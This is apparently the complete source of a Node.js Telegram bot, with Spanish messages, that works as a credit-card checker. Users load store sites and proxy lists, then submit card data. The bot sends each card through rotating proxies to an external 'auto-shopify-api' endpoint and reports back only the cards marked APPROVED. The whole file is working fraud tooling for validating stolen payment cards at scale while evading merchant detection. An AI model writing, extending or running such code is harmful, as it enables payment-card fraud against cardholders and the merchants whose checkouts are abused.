require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

// =====================
// CONFIG
// =====================
const TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = 8220432777;
const API_BASE = 'https://auto-shopify-api-production.up.railway.app/index.php';
const DATA_FILE = './data.json';

if (!TOKEN) {
  console.error('❌ BOT_TOKEN no definido');
  process.exit(1);
}

// =====================
// STORAGE
// =====================
let DB = { users: {} };
if (fs.existsSync(DATA_FILE)) {
  DB = JSON.parse(fs.readFileSync(DATA_FILE));
}
function saveDB() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(DB, null, 2));
}

function getUser(chatId) {
  if (!DB.users[chatId]) {
    DB.users[chatId] = {
      sites: [],
      proxies: [],
      running: false,
      stop: false,
      delay: 2000
    };
    saveDB();
  }
  return DB.users[chatId];
}

// =====================
// BOT
// =====================
const bot = new TelegramBot(TOKEN, {
  polling: { interval: 300, autoStart: true }
});

// =====================
// START
// =====================
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
`🤖 Bot activo

Comandos:
• /setsite <url>
• /addsites
• /setproxy <proxy>
• /addproxies
• /chk <datos>
• /stop

ℹ️ Solo APPROVED se envían al chat`
  );
});

// =====================
// SITES
// =====================
bot.onText(/\/setsite (.+)/, (msg, m) => {
  const u = getUser(msg.chat.id);
  u.sites = [m[1].trim()];
  saveDB();
  bot.sendMessage(msg.chat.id, '✅ Site guardado');
});

bot.onText(/\/addsites([\s\S]*)/, (msg, m) => {
  const u = getUser(msg.chat.id);
  const text = (m[1] || '').trim();

  if (!text) {
    return bot.sendMessage(
      msg.chat.id,
      '❌ Ejemplo:\n/addsites\nhttps://site1.com\nhttps://site2.com'
    );
  }

  const sites = text
    .split('\n')
    .map(s => s.trim())
    .filter(s => s.startsWith('http'));

  sites.forEach(s => {
    if (!u.sites.includes(s)) u.sites.push(s);
  });

  saveDB();
  bot.sendMessage(msg.chat.id, `✅ Sites agregados: ${sites.length}`);
});

// =====================
// PROXIES (FIXED)
// =====================
bot.onText(/\/setproxy (.+)/, (msg, m) => {
  const u = getUser(msg.chat.id);
  u.proxies = [m[1].trim()];
  saveDB();
  bot.sendMessage(msg.chat.id, '✅ Proxy guardado');
});

bot.onText(/\/addproxies([\s\S]*)/, (msg, m) => {
  const u = getUser(msg.chat.id);
  const text = (m[1] || '').trim();

  if (!text) {
    return bot.sendMessage(
      msg.chat.id,
      '❌ Ejemplo:\n/addproxies\nip:port:user:pass\nip:port:user:pass'
    );
  }

  const proxies = text
    .split('\n')
    .map(p => p.trim())
    .filter(p => p.includes(':'));

  if (!proxies.length) {
    return bot.sendMessage(msg.chat.id, '❌ No se detectaron proxies válidos');
  }

  proxies.forEach(p => {
    if (!u.proxies.includes(p)) u.proxies.push(p);
  });

  saveDB();
  bot.sendMessage(
    msg.chat.id,
    `✅ Proxies agregados: ${proxies.length}\n🧰 Total: ${u.proxies.length}`
  );
});

// =====================
// STOP
// =====================
bot.onText(/\/stop/, (msg) => {
  const u = getUser(msg.chat.id);
  u.stop = true;
  bot.sendMessage(msg.chat.id, '🛑 Proceso detenido');
});

// =====================
// CHK CON PROGRESO
// =====================
bot.onText(/\/chk([\s\S]*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = (match[1] || '').trim();
  const u = getUser(chatId);

  if (u.running) {
    return bot.sendMessage(chatId, '⚠️ Ya hay un CHK en proceso');
  }

  if (!input) {
    return bot.sendMessage(chatId, '❌ Envía datos después de /chk');
  }

  if (!u.sites.length || !u.proxies.length) {
    return bot.sendMessage(chatId, '❌ Agrega sites y proxies primero');
  }

  const list = input.split('\n').map(x => x.trim()).filter(Boolean);
  const total = list.length;

  let done = 0;
  let approved = 0;
  let failed = 0;

  const startTime = Date.now();
  u.running = true;
  u.stop = false;

  // Mensaje único de progreso
  const progressMsg = await bot.sendMessage(
    chatId,
`▱▱▱▱▱▱▱▱▱▱ 0% 0/${total}

⏱ 0:00 • ETA --:--
💳 ✅ 0 • ❌ 0`
  );

  for (let i = 0; i < total; i++) {
    if (u.stop) break;

    const cc = list[i];
    const site = u.sites[i % u.sites.length];
    const proxy = u.proxies[i % u.proxies.length];

    try {
      const res = await axios.get(API_BASE, {
        params: { site, cc, proxy },
        timeout: 30000
      });

      const d = res.data;
      done++;

      if (String(d.Response || '').toUpperCase().includes('APPROVED')) {
        approved++;
        await bot.sendMessage(
          chatId,
`━━━━━━━━━━━━━━
🟢 *APPROVED*
💳 ${cc}
🌐 ${site}
📤 ${d.Response}`,
          { parse_mode: 'Markdown' }
        );
      } else {
        failed++;
      }

    } catch (e) {
      done++;
      failed++;
    }

    const percent = Math.floor((done / total) * 100);
    const filled = Math.floor(percent / 10);
    const bar = '▰'.repeat(filled) + '▱'.repeat(10 - filled);

    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const speed = done ? (done / (elapsed / 60 || 1)) : 0;
    const eta = speed ? Math.floor(((total - done) / speed) * 60) : 0;

    await bot.editMessageText(
`${bar} ${percent}% ${done}/${total}

⏱ ${Math.floor(elapsed / 60)}:${String(elapsed % 60).padStart(2,'0')}
ETA ${Math.floor(eta / 60)}:${String(eta % 60).padStart(2,'0')}
💳 ✅ ${approved} • ❌ ${failed}`,
      {
        chat_id: chatId,
        message_id: progressMsg.message_id
      }
    );

    await new Promise(r => setTimeout(r, u.delay));
  }

  u.running = false;
  saveDB();
});
